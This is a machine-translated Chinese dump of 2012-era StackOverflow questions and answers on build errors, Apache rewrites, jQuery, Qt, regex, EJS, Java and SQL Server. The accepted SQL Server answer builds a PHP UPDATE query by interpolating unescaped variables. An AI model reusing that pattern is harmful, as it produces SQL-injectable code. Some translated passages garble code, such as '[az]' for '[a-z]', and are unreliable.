# StackOverflow 问答 13537000-13537999

# c++ - 在 CentOS Linux 中使用 Fix8 的 C++ 构建搞砸了 Berkeley DB 错误消息

> ID：13537000
> 
> 赞同：1
> 
> 时间：2012-11-23T23:48:13.027
> 
> 标签：c++, linux, makefile, centos, berkeley-db

我按照以下位置的说明成功构建了 BerkleyDB：
[http ://www.linuxfromscratch.org/blfs/view/svn/server/db.html](http://www.linuxfromscratch.org/blfs/view/svn/server/db.html)

我正在尝试在我的 CentOS 6.3 上构建 Fix8 (fix8.org) 并需要 BerkleyDB 的依赖，但我收到一个失败的错误：

```
libtool: link: g++ -g -O2 -Wall -rdynamic -o .libs/f8c f8c.o f8cutils.o f8precomp.o     
-lrt  /home/caustic/dev/dakka-fix8-b0a60e9/runtime/.libs/libfix8.so -lcrypt 
 -lPocoFoundation -lPocoNet -lPocoUtil -ltbb -L/home/caustic/dev/dakka-fix8-b0a60e9
 /runtime -ldb_cxx -lz -Wl,-rpath -Wl,/usr/local/lib

 /usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-redhat-linux/4.4.6/../..
 /../libdb_cxx.so when searching for -ldb_cxx

 /usr/bin/ld: skipping incompatible /usr/lib/libdb_cxx.so when searching for -ldb_cxx

 /usr/bin/ld: cannot find -ldb_cxx
 collect2: ld returned 1 exit status
 make: *** [f8c] Error 1 
```

当我“ls”指定的问题文件时，我得到：

```
[root@hft x86_64-redhat-linux]# ls  /usr/lib/gcc/x86_64-redhat-linux/4.4.6/../.. /../libdb_cxx.so
 /usr/lib/gcc/x86_64-redhat-linux/4.4.6/../../../libdb_cxx.so
 [root@hft x86_64-redhat-linux]# ls -l  /usr/lib/gcc/x86_64-redhat-linux/4.4.6/../../../libdb_cxx.so
 lrwxrwxrwx. 1 root root 16 Nov 23 17:36 /usr/lib/gcc/x86_64-redhat-linux/4.4.6/../../../libdb_cxx.so -> libdb_cxx-5.3.so 
```

我使用“yum remove”删除了所有旧的或冲突的 BerkleyDB 实例。有什么提示可以让我走上正轨吗？谢谢

# php - Mod_rewrite 和 URL 重定向 - APACHE、Mod_rewrite、PHP、Codeigniter

> ID：13537003
> 
> 赞同：0
> 
> 时间：2012-11-23T23:48:46.053
> 
> 标签：php, apache, .htaccess, codeigniter, mod-rewrite

我有一个非常具体的问题。我正在使用 wamp 服务器在本地运行我的 codeigniter 项目。我已经加载了 mod_rewrite，它显示在我的 phpinfo 中。

在我的 wamp 根目录中，我有一个 codeigniter 项目文件夹“mysite”。这是 mysite 的目录结构。

```
-mysite
   |--images
   |--eshots
   |--useruploads
   |--temp
   |--SpryAssets
   |--css
   |--js
   |--timthumb 
```

启用此 mod_rewrite 后，我修改了 windows 目录中的“主机”文件，并在我的虚拟主机文件中添加了这行代码，以便像这样访问我的网站。(mysite.local)

```
 127.0.0.1 mysite.local 
```

在此之后，我在根目录（即 mysite 文件夹下）创建了一个 htaccess 文件

```
 htaccess file:

  RewriteEngine on

  RewriteCond $1  !^(index\.php|images|lists|eshots|useruploads|temp|SpryAssets|css|js|robots\.txt|timthumb\.php)

  RewriteRule ^(.*)$ /index.php?$1 [L]

  <IfModule mod_security.c>

  SecFilterEngine Off

  SecFilterScanPOST Off

  </IfModule> 
```

在此之后，当我尝试从 wamp 访问我的网站时，它导致我无处可去。例如，如果我从 localhost 的项目文件夹（即 mysite）单击，它会将我带回 localhost 文件夹，我的 URL 如下所示：

[http://mysite.local/mysite/](http://mysite.local/mysite/)

当我再次单击 mysite 时，它​​会显示如下 URL：

[http://mysite.local/mysite/mysite](http://mysite.local/mysite/mysite)

在此之后，我的链接不会将我带到网页。并停留在这里。为什么我从服务器得到这种行为？停止此操作的 CODEIGNITER 或 htaccess 文件是否有任何问题？以及我需要执行哪些步骤才能使每个 N 都正常工作，包括 javascript、css、images 。

**如何应对这个具有挑战性的问题？**
大多数人说您需要启用 mod_rewrite 或阅读 Apache 提供的手册。

[更新]：当我尝试 WID 新的 codeigniter 项目时。首先，我将除 htaccess 文件之外的所有文件复制到项目文件夹中。幸运的是，我能够导航到索引页面，但它没有显示任何 css、图像、脚本。我的 htaccess 仅包含以下位： RewriteEngine on .

我现在应该怎么做才能使我的 js、图像像上面那样工作？Apache_error 日志看起来像这样：。此外，当我尝试进入下一页时，它会显示“（错误：404）请求的 URL /Code/wham.local /categories/listings/Products was not found”。请建议。其中 wham.local 是虚拟主机。

**apache_error 日志：**

```
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/css, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/css, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/js, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/js, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/js, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/js, referer: http://localhost/Code/

 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/js, referer: http://localhost/Code/

 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images, referer: http://localhost/Code/
 [Sun Nov 25 13:00:54 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images
 [Sun Nov 25 13:01:03 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images
 [Sun Nov 25 13:01:55 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/images
 [Sun Nov 25 13:01:56 2012] [error] [client 127.0.0.1] File does not exist: D:/wamp/www/Code/wham.local, referer: http://localhost/Code/ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T18:33:14.767

检查 C:\wamp\bin\apache\Apache2.2.17\conf 中的 http.conf 文件，如果它们是这样的条目 #Virtual hosts #Include conf/extra/httpd-vhosts.conf 然后打开文件 httpd-vhosts.conf在其中添加以下行。

```
 <VirtualHost *:80>
       DocumentRoot  "C:/wamp/www/mysite/"
       ServerName     mysite.local
      </VirtualHost>

     <VirtualHost *:80>
      DocumentRoot  "C:/wamp/www/"
      ServerName     localhost
      </VirtualHost> 
```

否则，您也可以将此行添加到 httpd.conf 文件并重新启动您的服务器。这是虚拟主机的概念。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-11T21:08:40.537

您需要为 apache 启用重写模块。您可以通过转到 `wamp tray icon`> `apache`>`apache module`然后选择来执行此操作`rewrite module`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T00:20:28.033

看起来这条线在惹你生气：

```
RewriteCond $1  !^(index\.php|images|lists|eshots|useruploads|temp|SpryAssets|css|js|robots\.txt|timthumb\.php) 
```

试试这个

```
RewriteCond %{REQUEST_URI}  !^(index\.php|images|lists|eshots|useruploads|temp|SpryAssets|css|js|robots\.txt|timthumb\.php) 
```

# google-app-engine - 如何为 com.google.appengine.api.blobstore.BlobInfo 计算 md5Hash

> ID：13537010
> 
> 赞同：8
> 
> 时间：2012-11-23T23:49:49.333
> 
> 标签：google-app-engine, md5, blobstore, duplicate-removal, message-digest

我们试图避免保存重复的文件。但是，我们的 md5 结果总是与 BlobInfo 不同。

我们如何计算它：

```
 MessageDigest messageDigest = java.security.MessageDigest.getInstance("MD5");
    digest = messageDigest.digest(bytes);
    String digestString = DigestUtils.md5Hex(digest); 
```

它不匹配：与`(new BlobInfoFactory().loadBlobInfo(blobKey)).getMd5Hash();`

示例不匹配：

```
google vs my own calculation:
8cdeb6db94bc4fd156e2975fd8ebbcf2 vs 9003b37afbf3637de96c35774069453f 
65a25dafcba58d16d58a9c7585cc3932 vs 52383159f7d27417d50121aaee2728b5 
5cccc2d690fdc0c254234d5526876b34 vs 8196da9b6733daa60e08d927693df483 
```

它在生产服务器上。（我们没有测试开发环境）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-26T20:11:19.183

Sebastian Kreft 在评论中的上述讨论中是正确的。

我复制的代码是错误的。它应该是：

```
String digestString = DigestUtils.md5Hex(bytes); 
```

Sebastian Kreft 使用这个技巧来验证空文件的 md5，它应该始终是 d41d8cd98f00b204e9800998ecf8427e！

# jquery - 单击时调整 div 的大小并隐藏父级中的所有其他 div。

> ID：13537011
> 
> 赞同：0
> 
> 时间：2012-11-23T23:50:01.487
> 
> 标签：jquery, jquery-animate, image-gallery

我正在尝试创建一个画廊，但对 jQuery 来说是全新的，我陷入了一种僵局。

我想创建一个由几张小图片组成的画廊，这些图片在点击时会扩大到全宽，而在另一张图片上又会恢复到原来的样子。同时，我希望在单击图像展开时隐藏父包装中的所有其余 div。所有这些都必须顺利而漂亮地运行。那是我达不到的。所有图片都有 .image 类，每个图片都有 .one .two 类，以此类推。他们都在父母的包裹下。

```
$(".image").bind('click', function() {
     $(this).animate({width: "100%", height: "100%"}, 800);
$(".image").not(this).hide("slow");
});

$('.image').toggle(function(){
    $(this).animate({width: "100%", height: "100%"}, 800);    
}, function(){
    $(this).animate({width: "90px", height: "90px"}, 800);
    $(".image").not(this).show("slow");
}); 
```

我现在努力的结果[http://jsfiddle.net/baltar/TRuNv/4/](http://jsfiddle.net/baltar/TRuNv/4/)

这里是平滑的好例子[http://css-tricks.com/examples/InfoGrid/](http://css-tricks.com/examples/InfoGrid/)

此外，动态调整父 div 的高度也很棒，因此任何比例的图像都适合。我试图将父母的高度设置为自动，但这没有用。

我意识到我的问题太大了，但也许至少有人可以建议我应该关注哪个方向。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:12:07.617

以下 jQuery 完成了您所要求的*大部分工作：*

```
$(".image").bind('click', function() {
    var that = $(this), // caching the current element
        offsets = that.position(), // edited to use position() instead of offset()
        top = offsets.top,
        left = offsets.left,
        clone = that.clone(),
        parent = that.parent(), // caching the parent element
        width = parent.width(),
        height = parent.height();

    // adding the 'clone' element to the parent, and adding the 'clone' class-name    
    clone.addClass('clone').appendTo(parent).css({
        // positioning the element at the same coordinates
        // as the current $(this) element
        'top': top,
        'left': left
    }).animate({
        // animating to the top-left corner of the parent, and
        // to the parent's dimensions
        'top': 0,
        'left': 0,
        'width': width,
        'height': height
    }, 1000).click( // binding a click-handler to remove the element

    function() {
        // also fading the sibling elements back to full opacity
        $(this).fadeOut().siblings().animate({
            'opacity': 1
        }, 1000);
    }).siblings().animate({
        // fading-out the sibling elements
        'opacity': 0.1
    }, 1000);

});​ 
```

这需要CSS：

```
.wrap {
    /* your other unchanged CSS, and: */
    position: relative;
}
.clone {
    position: absolute;
} 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/TRuNv/7/)。

参考：

*   [`addClass()`](http://api.jquery.com/addClass/).
*   [`animate()`](http://api.jquery.com/animate/).
*   [`click()`](http://api.jquery.com/click/).
*   [`clone()`](http://api.jquery.com/clone/).
*   [`fadeOut()`](http://api.jquery.com/fadeOut/).
*   [`height()`](http://api.jquery.com/height/).
*   [`offset()`](http://api.jquery.com/offset/).
*   [`parent()`](http://api.jquery.com/parent/).
*   [`position()`](http://api.jquery.com/position/).
*   [`siblings()`](http://api.jquery.com/siblings/).
*   [`width()`](http://api.jquery.com/width/).

# python - 如何在 Python 中打开 AIFC 文件以将标记数据附加到文件中？

> ID：13537013
> 
> 赞同：1
> 
> 时间：2012-11-23T23:51:04.473
> 
> 标签：python, objective-c, audio

我已经在 Mac 上将名为 Python 的模块导入`aifc`到 Python 中，我正在运行 Python 3.3 和 Mac OS X 10.8.2。

我试图简单地将标记数据从一个 aifc 文件复制到另一个 aifc 文件。我可以成功打开第一个文件并读取标记数据，效果很好。但是当我打开第二个 aifc 文件时，该方法`aifc.open("file2.aifc", 'w')`会立即删除该文件的所有内容。所以我最终得到了一个带有正确标记但没有音乐的 aifc 文件！

我做了一些研究，发现使用 mode 打开文件时删除文件的内容是 Python 的正确行为`'w'`。我读过该模式`'a'`允许附加文件。但是，`aifc.open()`当我尝试 mode 时，该方法给了我一个错误`'a'`，解释器说 mode 必须是`"r"` `"rb"` `"w"`or `"wb"`。

因此我被困住了——也许这是一个旧图书馆，我应该使用不同的东西。

如果是这样，有人可以指导我如何在 Python 中访问 Apple Objective C 库来操作音频文件。我认为有一个名为 Audio File Services 的库，但我不清楚如何在 Python 中使用它。

虽然我不是编程新手，但我是 Python 新手，如果这些是新手问题，我深表歉意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T01:41:55.507

我自己也遇到过这个！

辅助函数明确地将`aifc.open`模式限制为“r”、“rb”、“w”和“wb”。这个模块中的类（`Aifc_read`和`Aifc_write`）似乎分别仅用于读取现有的 AIFC 文件或从头开始创建全新的 AIFC 文件。

这是我使用此模块提出的可读+可写 AIFC 文件实用程序：

```
import aifc
import sys

class AIFC(aifc.Aifc_write, aifc.Aifc_read):

    def __init__(self, f):
        aifc.Aifc_write.initfp(self, f)
        aifc.Aifc_read.initfp(self, f)

if (__name__ == "__main__"):
    f = open(sys.argv[1], "rb+")
    a = AIFC(f)

    # read test
    print("%s channels, %s bits, %s Hz sampling rate, %s frames" %
          (a.getnchannels(), a.getsampwidth() * 8, a.getframerate(),
           a.getnframes()))

    # write ("identity") test
    data = a.readframes(a.getnframes())
    a.setpos(0)
    a.writeframes(data)
    a.close()   # f.close() 
```

它尚未经过广泛测试，但似乎确实可以解决问题。我已经通过它运行了几个原始 AIF，它们都在 Audacity 中正确播放。

# ios - 移动 Safari 忽略的自定义文本格式的 Mime 类型

> ID：13537014
> 
> 赞同：3
> 
> 时间：2012-11-23T23:51:05.603
> 
> 标签：ios, mobile-safari, mime-types

我有一个基于 json 的自定义格式，我需要将其打开为`application/octet-stream`.

我已经开始`.htaccess`阅读了。。

```
AddType application/octet-stream .custom 
```

我的自定义文件在哪里使用`.custom`扩展名，即。`document.custom`

当我在 OS X 上的 Chrome、Chromium 或 Safari 中打开该目录时，该文件被假定为`application/octet-stream`正确并直接下载。

Mobile Safari（iOS6）将其打开`plain/text`并显示在浏览器中，类型注册为应用程序的UTI，并从邮件附件中正确打开。

有任何想法吗？

# qt - 将 Qt GUI 与应用程序外部的对象一起使用

> ID：13537018
> 
> 赞同：2
> 
> 时间：2012-11-23T23:51:33.777
> 
> 标签：qt, user-interface

我正在创建一个 Qt GUI，它将为用户生成一些表单，让他们填写，然后将表单保存在二叉搜索树中，然后将其序列化。这是使用 Qt（显然）、c++ 和 boost 完成的。GUI 是此时与应用程序的唯一界面。我想在 GUI 之外实例化我的二叉搜索树对象，因为在主 GUI 类中创建它似乎是一种糟糕的设计模式。这个想法正确吗？

这是我`main()`现在的情况：

```
int main (int argc, char *argv[])
{
    QApplication app(argc, argv);
    ChocAnGui *gui = new ChocAnGui;
    gui->show();

    return app.exec();
} 
```

有没有办法创建一个`ChocAnGui`类可以使用的 BST 对象，但它存在于实际的 GUI 之外？我想做类似的事情：

```
int main (int argc, char *argv[])
{
    MyBST bst = new MyBST;
    MyRecord record = new MyRecord;

    QApplication app(argc, argv);
    ChocAnGui *gui = new ChocAnGui;
    gui->show();

    return app.exec();
} 
```

然后我希望 GUI 能够从内部调用`MyBST`和`MyRecord`类的方法。因为在应用程序的开始和结束时我正在序列化和反序列化数据，这似乎是最抽象的方法（相对于从 GUI 代码本身进行序列化和反序列化）。我希望这个问题很清楚......我正在学习所有这些东西。有没有办法通过这些变量`QApplication(argc, argv)`？最终，记录和 BST 类将被构建到数据库中，同样，在 GUI 之外创建实例似乎最简单。感谢您提供的任何意见。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:57:56.450

我认为只有当您的二进制搜索需要很长时间并且可能阻塞 GUI 线程时，才有必要将二进制搜索树放在 GUI 线程之外。如果是这种情况，您要做的是将 MyBST 对象放在另一个线程下，

在您的主应用程序中，创建一个新线程来处理所有 BST 操作：

```
QThread * BSTThread = new QThread();
BSTThread->start(); 
```

BSTThread 是一个拥有自己的事件队列的新线程。然后你创建你的 MyBST 对象，确保 MyBST 继承 QObject，你可以在对象上调用 moveToThread 方法。

```
MyBST * bst = new MyBST();
bst->moveToThread(BSTThread); 
```

当主应用程序想要与 MyBST 通信时，您会从主应用程序发出一个信号。使用 Qt::QueuedConnection 将信号连接到 MyBST 类中的插槽，或者仅使用 Qt::AutoConnection，它将自动排队连接，因为您的 bst 对象与主应用程序位于不同的线程中，并且插槽中的函数将由 BSTThread 执行。

并且当 bst 对象想要与主应用程序通信时，也会发出一个信号，该信号连接到主应用程序中的插槽，它将在您的 mainThread 中正确处理。这样，你的通信是异步的，当你向 bst 对象发送请求时，你不能立即得到结果，因为你把它作为一个信号发送，它被发布到 BSTThread 的事件队列中等待处理。BSTThread 处理来自主应用程序的请求后，将结果回传到主线程的事件队列，主线程处理结果并更新 GUI。

如果您想了解更多详细信息，我认为您需要阅读有关 QT 的[http://doc.qt.digia.com/qt/thread-basics.html 。](http://doc.qt.digia.com/qt/thread-basics.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T00:17:00.423

只需创建您的窗口来声明一个`MyBST`成员：

```
class MyBST;

class ChocAnGui
    : public QMainWindow
{
    Q_OBJECT

 public:
   ChocAnGui(MyBST* aBst = 0, QWidget *parent = 0);
   MyBST *bst 
```

然后用你的对象初始化它：

```
ChocAnGui *gui = new ChocAnGui(bst); 
```

或者你不能让它成为一个成员，让你的 gui 总是带一个`MyBST`指针：

```
class MyBST;

class ChocAnGui
    : public QMainWindow
{
    Q_OBJECT

 public:
   ChocAnGui(QWidget *parent = 0);
   void doSomething(MyBST*); 
```

# c# - 列表框显示两个时间相同的值

> ID：13537029
> 
> 赞同：2
> 
> 时间：2012-11-23T23:52:53.377
> 
> 标签：c#, asp.net, sql

我正在使用 asp.net C# SQL 创建一个网页。我需要列出一个 courseID 让用户选择，但它在下拉列表 S1111 S2222 S3333 S1111 S2222 S3333 中列出了两个相同的值，有人帮忙

```
 protected void Page_Load(object sender, EventArgs e)
    {  
        SqlConnection conn;
        SqlDataReader dtr;
        SqlCommand cmd;

        string Connnection = ConfigurationManager.ConnectionStrings["ELearing"].ConnectionString;
        conn = new SqlConnection(Connnection);

        if (!Page.IsPostBack)
        {
            //Get Staff Information
            conn.Open();
            string cmdString = "SELECT DISTINCT CourseID FROM Schedule WHERE(StaffID = @scheduleStaffID)";
            cmd = new SqlCommand(cmdString, conn);
            cmd.Parameters.AddWithValue("@scheduleStaffID", Session["UserID"].ToString());

            dtr = cmd.ExecuteReader();

            while (dtr.Read())
            {
                ddlCourse.Items.Add(dtr["CourseID"].ToString());
            }
            dtr.Close();
            conn.Close();
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T00:18:27.717

试试这些

1.当您在*外部*执行SELECT DISTINCT CourseID FROM Schedule WHERE StaffId = 1时，您是否得到重复

2.使用断点检查额外的回发。

3.在您的while循环之前尝试ddlCourse.Items.Clear。

# python - 将两个正则表达式连接在一起

> ID：13537031
> 
> 赞同：1
> 
> 时间：2012-11-23T23:53:39.873
> 
> 标签：python, regex

我有两个正则表达式，一个匹配所有字符，另一个匹配以下字符`[a-z]`组合`[^spuz(ih)]`（字符`s, p, u, z, ih`）我将如何组合这两个以便我可以允许除第二个 RE 中列出的字符之外的所有字母数字字符？

```
(re.match(r'^[a-z]*(?![spuz]|ih)[a-z]s$', insert_phrase) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T23:59:41.077

您不能这样“组合”它们，但您可以编写另一个具有相同效果的正则表达式。为此，您可以使用 (?!) 构造。仅当其中的正则表达式与以下部分*不*匹配时，它才匹配 0 个字符。所以你可以使用：

```
'(?![spuz(ih)])[a-z]' 
```

或者，由于这不是您想要的，请将其更改为：

```
'(?![spuz]|ih)[a-z]' 
```

在更改后的问题中，您似乎想要消极的向后看。这将模式转换为：

```
'^[a-z]*(?<![a-z][spuz]|ih)s$' 
```

请注意后视部分中的额外 [az]。这是必需的，因为lookbehind 表达式必须是固定宽度。这意味着像 'ps' 这样的字符串*将*匹配模式，但您不希望这样。因此，最好使用两个单独的lookbehinds（两者都必须为true才能匹配字符串）：

```
'^[a-z]*(?<![spuz])(?<!ih)s$' 
```

# node.js - node.js ejs 包含错误

> ID：13537032
> 
> 赞同：5
> 
> 时间：2012-11-23T23:53:44.767
> 
> 标签：node.js, ejs

我正在创建这个模板：

```
<% include head %>
<Placemark>
    <name><%=name%></name>
    <description><%=description%></description>
    <Point>
        <coordinates><%=coordinates%></coordinates>
        </Point>
</Placemark>
<% include foot %> 
```

但我总是得到这个错误：

```
if (!filename) throw new Error('filename option is required for includ
                         ^ 
```

目录：

```
justas@justas-Studio-1555:~/node-socket.io/socket.io/examples/kml$ ls -1
app.js
foot.ejs
head.ejs
placemark.ejs 
```

有人可以帮忙吗，我根据工具箱一切都应该工作

应用程序.js：

```
var http = require('http');
var ejs = require('ejs');

var fs = require('fs')

http.createServer(function (req, res) {

res.writeHead(200, {'Content-Type': 'text/xml'});

fs.readFile('placemark.ejs', 'utf8', function (err, template) {

var content = ejs.render(template,{
    name:"test name",
    description:"this is the description",
    coordinates:"-122.0822035425683,37.42228990140251,0"
});

res.write(content);
res.end()
});
}).listen(8000);
console.log('Server listening at at xxxxxxxx'); 
```

使用 ejs 我渲染模板，它从其他模板构造。使用 ejs-locals 它说它没有方法渲染。有没有办法只用'ejs'来做到这一点？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-23T23:59:30.680

这是一个工作示例：

看来您需要传入模板的文件名才能使用包含 - 请参见[此处的示例](https://github.com/visionmedia/ejs/blob/master/examples/functions.js)

```
var http = require('http');
var ejs = require('ejs');

var fs = require('fs');

http.createServer(function (req, res) {

res.writeHead(200, {'Content-Type': 'text/xml'});

fs.readFile('placemark.ejs', 'utf8', function (err, template) {

var content = ejs.render(template,{
    name:"test name",
    description:"this is the description",
    coordinates:"-122.0822035425683,37.42228990140251,0",
    filename: __dirname + '/placemark.ejs'
});

res.write(content);
res.end()
});
}).listen(8000);
console.log('Server listening at at xxxxxxxx'); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-09T13:41:19.633

我最近也遇到了这个错误。我看到了 alexjamesbrown 的回答，但我不喜欢这个解决方案。我宁愿不为每个渲染都包含文件名变量；代码可能会变得混乱！我更愿意将文件包含在单个视图中。

所以我深入研究了 ejs lib 文件并删除了对文件名变量的要求。

您将在第 157 行的 \ejs\lib\ejs.js 中找到以下内容

```
if (!filename) throw new Error('filename option is required for includes'); 
```

只需注释掉该行并`<% include views\include.ejs %>`在您的 .ejs 文件中使用以包含您的个人视图。

以上对ejs版本0.8.4有效

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-24T08:16:01.380

刚刚碰到这个问题，这里是你如何定义一个模板文件夹并将这些模板包含在你的主 ejs 文件中：

```
var renderedHtml = ejs.render(content, 
                            {
                                data: data,
                                filename: __dirname + '/app/templates/*'
                            }
                        ); 
```

# java - Java 堆和按值传递

> ID：13537033
> 
> 赞同：1
> 
> 时间：2012-11-23T23:53:53.927
> 
> 标签：java, memory, heap-memory, pass-by-value

我对我的 Java 程序如何分配内存有点困惑。以下是我程序中的典型情况。我在一个类的堆上创建了一个对象，我将它传递给其他类中的其他函数。

```
public class A {
    private List<Integer> list = new ArrayList<Integer>();

    public A() {
        for(int i = 0; i < 100; i++)
            list.add(i);
    }

    public void foo() {
        B b = new B();
        b.bar(this.list);
    }
}

public class B {
    A a = new A();

    public int bar(List<Integer> list) {
        list.add(-1);
        return list.size();
    }

    public int getSize() {
        List<Integer> list = a.list;
        return a.size();
    }
} 
```

我的问题是关于如何使用内存。当 A 的列表被传递给 B.bar() 时，内存是否被复制？Java 是按值传递的，所以我假设 B.bar() 函数现在包含列表的副本，该列表也分配在堆上？还是复制列表并将其放入堆栈？还是列表完全重复？同样，什么适用于 B.getSize() 中的这些内存问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T23:56:50.480

可能更清楚地说，在 Java 中，[对象引用是按值传递的](http://javadude.com/articles/passbyvalue.htm)。

所以 B 获得了对 List 的*引用*（这是一个值）的副本，而不是*List 本身*的副本。

您可以通过让 B 修改列表（通过添加或删除某些内容）并观察 A 的列表也发生变化（即它是同一个列表）来轻松地向自己证明这一点。

但是，如果您更改 B 对 List 的引用（通过创建并分配一个新 List 给它），A 的引用不会改变。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T00:02:25.780

Java 是按值传递的，但表达式或变量的值始终是原始值或引用。反过来，引用要么是空的，要么是指向某个对象的指针。

在您的情况下：`private List<Integer> list = new ArrayList<Integer>();`将 list 声明为具有引用类型，并使其值成为指向新分配的 ArrayList 对象的指针。

当您`list`用作实际参数时，例如在`b.bar(this.list);`调用中，b.bar 中的正式参数列表将使用该指针的副本进行初始化。也就是说，bar 的形式参数指向与 A 创建的相同的 ArrayList 对象。不会复制 ArrayList 对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T23:59:57.327

[Java 是按值传递的，该死！](http://javadude.com/articles/passbyvalue.htm)

但是，您只能访问对对象的引用。从这个意义上说，您正在*通过 value 传递 Object 引用*。

# php - PHP 需要引号才能在 SQL Server 数据库中使用“事务”表

> ID：13537038
> 
> 赞同：2
> 
> 时间：2012-11-23T23:56:45.123
> 
> 标签：php, sql, sql-server

在 ms sql 服务器中，我有一个表，它的名称是“事务”，我知道我必须在事务表上加上“”符号才能使用 sql 查询选择表我的意思是如果我使用

```
select SalesTax
from "Transaction"
where Total = 59.00 
```

然后它工作

但如果我使用

```
select SalesTax
from Transaction
where Total = 59.00 
```

然后它不起作用

我想知道的是在 php 脚本中选择表仍然 php 无法识别事务表我也尝试过“事务”和“事务”但它不起作用有人知道吗？下面是我用来更新的 php 脚本..

```
$tsql = "UPDATE Transaction SET Quantity = (Quantity - $qty)
         WHERE ItemLookupCode = '$sku'"; 
```

非常感谢你们提前......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T23:59:13.913

在 SQL Server 中，可以使用方括号对保留字进行转义`[]`。

所以你可以试试：

```
$tsql = "UPDATE [Transaction] 
         SET Quantity = (Quantity - $qty) 
         WHERE ItemLookupCode = '$sku'"; 
```

*注意：出于这个确切原因，您不应使用保留字命名表等。*

# javascript - 从右到左评估，从左到右链方法

> ID：13537040
> 
> 赞同：4
> 
> 时间：2012-11-23T23:56:53.117
> 
> 标签：javascript

以下函数中的表达式从右到左求值

```
function foo(){

var a = b = c;

} 
```

所以就像是这样输入的

```
var a = (b = 0) 
```

但是，当方法链接在一起时，它们是从左到右读取的。此对象中的方法...

```
var obj = {
   value: 1,
   increment: function () {
       this.value += 1;
       return this;
  },
  add: function (v) {
      this.value += v;
     return this;
  },
  shout: function () {
      alert(this.value);
  }
}; 
```

可以这样调用，从左到右求值

```
obj.increment().add(3).shout(); // 5 
```

// 而不是一一调用

```
obj.increment();
obj.add(3);
obj.shout(); // 5 
```

所以，我想我知道什么时候从左到右和从右到左阅读，但是有一个规则我需要知道我不知道吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-24T00:09:43.507

规则称为“运算符关联性”，与运算符优先级一起，是大多数语言中每个运算符（算术、成员访问、一元或二元等）的属性。关联性通常由语言规范定义，并且经常可以在书籍、教程、备忘单等中找到。javascript 的第一个谷歌结果之一在这里：[http ://www.javascriptkit.com/jsref/precedence_operators.shtml](http://www.javascriptkit.com/jsref/precedence_operators.shtml)

# facebook - 理解多个类似按钮/框和 Facebook 页面

> ID：13537042
> 
> 赞同：2
> 
> 时间：2012-11-23T23:57:27.357
> 
> 标签：facebook, facebook-like, facebook-page

我现在在我的网站上有一个稍微令人困惑的设置：

*   将 data-ref 属性设置为我网站根域的点赞按钮
*   我为我的网站创建的 Facebook 页面上设置了 date-ref 的类似框。

这些显然会导致不同的事情，因为点赞按钮有 2.7k 点赞，而点赞框/Facebook 页面大约有 600 个。最后一个数字也是我在常规 Facebook 页面上看到的点赞数。

现在我还注意到我有第二个 Facebook 页面，说它是我网页的管理页面。该页面从未用于发布任何内容，而且除了我之外的任何人似乎都看不到它。这个页面有700个赞。

我一直在阅读关于这些东西的文档，但我对合并页面或任何东西还没有信心，所以我有几个问题我希望比我更有 Facebook 经验的人能回答：

1.  这个 700 数字从何而来？它不会显示在我的赞按钮或我的赞框中。

2.  我有什么办法可以将这三个不同的计数合二为一吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-03T21:29:52.537

*   700 是在您创建代表该 URL 的管理页面后喜欢该 URL 的人数 - 现在这无关紧要，因为该功能已被弃用。（请参阅 CBroe 提供的链接：developers.facebook.com/docs/reference/plugins/like/migration

*   无法将粉丝从一个对象或页面迁移到另一个对象或页面，除非在该文档中概述的迁移期间允许，如果您在此期间未迁移，则无法将站点/域的粉丝移动为粉丝Facebook 页面的

# javascript - 轻松检测用户何时更改 DOM

> ID：13537043
> 
